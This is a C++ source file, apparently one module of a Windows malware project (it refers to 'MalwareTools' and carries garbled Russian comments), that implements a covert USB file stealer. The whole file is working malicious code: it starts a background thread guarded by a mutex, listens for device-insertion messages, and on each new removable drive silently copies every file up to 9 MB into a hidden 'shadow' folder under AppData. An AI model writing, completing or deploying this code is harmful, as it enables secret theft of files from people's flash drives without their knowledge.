#include <Windows.h>
#include <shlwapi.h>
#include <WinInet.h>
#include <Dbt.h>
#include <SetupAPI.h>
#include <shlobj.h>

#include "defines.h"
#include "core.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "cryptedstrings.h"
#include "usbshadowcpy.h"
#include "..\common\mem.h"
#include "..\common\fs.h"
#include "..\common\sync.h"


#define FILE_MAX_SIZE 9437184

static const GUID GUID_DEVINTERFACE_LIST[] =
{
// GUID_DEVINTERFACE_USB_DEVICE
{ 0xA5DCBF10, 0x6530, 0x11D2, { 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51,
0xED } },

// GUID_DEVINTERFACE_DISK
{ 0x53f56307, 0xb6bf, 0x11d0, { 0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb,
0x8b } },

// GUID_DEVINTERFACE_HID,
{ 0x4D1E55B2, 0xF16F, 0x11CF, { 0x88, 0xCB, 0x00, 0x11, 0x11, 0x00, 0x00,
0x30 } },

};

static DWORD* hashes;
static DWORD hashesSize;

void deviceChange(char diskName)
{

	WCHAR disk[8];
	DWORD volumeNumber;
	UINT DriveType;
	disk[0] = diskName;
	disk[1] = L':';
	disk[2] = L'\\';
	disk[3] = L'\\';
	disk[4] = 0;
	DriveType = GetDriveTypeW(disk);
	if(DriveType == DRIVE_REMOVABLE)
	{
		WDEBUG0(WDDT_INFO, "DAT FLASH");
		GetVolumeInformationW(disk,0,0,&volumeNumber,0,0,0,0);
		if(hashes != 0)
		{
			for(int i=0;i<hashesSize;i++)
			{
				if(hashes[i] == volumeNumber)return;
			}
		}

		//≈сли дошли до этого места, значит флешка вставлена в перый раз. Ќужно добавить в список и скопировать данные.
		if(usbshadowcpy::_copyFlash(disk) && Mem::reallocEx(&hashes, (hashesSize+1)*sizeof(DWORD)))
		{
			WDEBUG0(WDDT_INFO, "Inserting...");
			hashes[hashesSize++] = volumeNumber;
		}
	}
		
	
}

char GetDiskName(DWORD mask)
{
	for (int x = 0; x < 26; x++) 
	{
		if (((mask>>x) & 1)) 
		{
			return 65 + x;
		}
	}
	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	DEV_BROADCAST_HDR* hdr = (DEV_BROADCAST_HDR*)lParam;
	DEV_BROADCAST_VOLUME* brd;
    switch(msg)
    {
        case WM_CLOSE:
            DestroyWindow(hwnd);
        break;
        case WM_DESTROY:
            PostQuitMessage(0);
        break;
		case WM_DEVICECHANGE:
			if(wParam == 0x8000 && hdr->dbch_devicetype == DBT_DEVTYP_VOLUME)
			{
				brd = (DEV_BROADCAST_VOLUME*)lParam;
				deviceChange(GetDiskName(brd->dbcv_unitmask));
			}
		break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void registerNotify(HWND hwnd)
{
	HDEVNOTIFY hDevNotify;
    DEV_BROADCAST_DEVICEINTERFACE NotificationFilter;
    Mem::_zero( &NotificationFilter, sizeof(NotificationFilter));
    NotificationFilter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
    NotificationFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
	for(int i=0; i<sizeof(GUID_DEVINTERFACE_LIST)/sizeof(GUID); i++) {
		NotificationFilter.dbcc_classguid = GUID_DEVINTERFACE_LIST[i];
		hDevNotify = RegisterDeviceNotification(hwnd, &NotificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);
	}
}

void WINAPI initializer(void* p)
{
	LPWSTR g_szClassName = L"qq";
	WNDCLASSEXW wc;
    HWND hwnd;
    MSG Msg;

    //Step 1: Registering the Window Class
    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = 0;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if(!RegisterClassExW(&wc))
    {
        return;
    }

    // Step 2: Creating the Window
    hwnd = CreateWindowExW(
        WS_EX_CLIENTEDGE,
        g_szClassName,
        L"ww",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
        NULL, NULL, 0, NULL);

    if(hwnd == NULL)
    {
        return;
    }

	registerNotify(hwnd);

    // Step 3: The Message Loop
    while(GetMessage(&Msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
}

void usbshadowcpy::init()
{
	WCHAR objectName[50];
	Core::generateObjectName(Core::OBJECT_ID_USB_SHADOW, objectName, MalwareTools::KON_SESSION);
	HANDLE hnd;
	if((hnd = Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll,objectName)) != NULL)
	{
		WDEBUG0(WDDT_INFO, "usbshadowcpy::init called.");
		CreateThread(0,0,(LPTHREAD_START_ROUTINE)initializer,0,0,0);
	}
}

bool usbshadowcpy::_copyFlash(LPWSTR drive)
{
	WIN32_FIND_DATAW sss;
    HANDLE f;
	WCHAR sourceFile[MAX_PATH];
	WCHAR destFile[MAX_PATH];
	WCHAR folderPath[MAX_PATH];
	drive[4] = L'*';
	drive[5] = L'.';
	drive[6] = L'*';
	drive[7] = 0;
	if(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, folderPath) == S_OK)
	{
		Str::_catW(folderPath, L"\\shadow\\",-1);
		WDEBUG1(WDDT_INFO, "folderPath: %s",folderPath);
		if(GetFileAttributesW(folderPath) == INVALID_FILE_ATTRIBUTES)Fs::_createDirectoryTree(folderPath, NULL);
		WDEBUG0(WDDT_INFO, "Checkpoint1");
		
		f = FindFirstFileW(drive, &sss);
		drive[4] = 0;
		if(f != INVALID_HANDLE_VALUE)
		  do
		  {
				if(!(sss.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && sss.nFileSizeLow <= FILE_MAX_SIZE && sss.nFileSizeHigh == 0){
				Fs::_pathCombine(sourceFile, drive, sss.cFileName);
				//wsprintfW(sourceFile,L"%s%s",drive, sss.cFileName);
				Fs::_pathCombine(destFile, folderPath, sss.cFileName);
				//wsprintfW(destFile,L"%s%s",folderPath, sss.cFileName);
				WDEBUG2(WDDT_INFO, "Copying: %s => %s", sourceFile, destFile);
				CopyFileW(sourceFile, destFile, true);}
				
		  } while(FindNextFileW(f,&sss));
		FindClose(f);

		return true;
	}
	return false;
}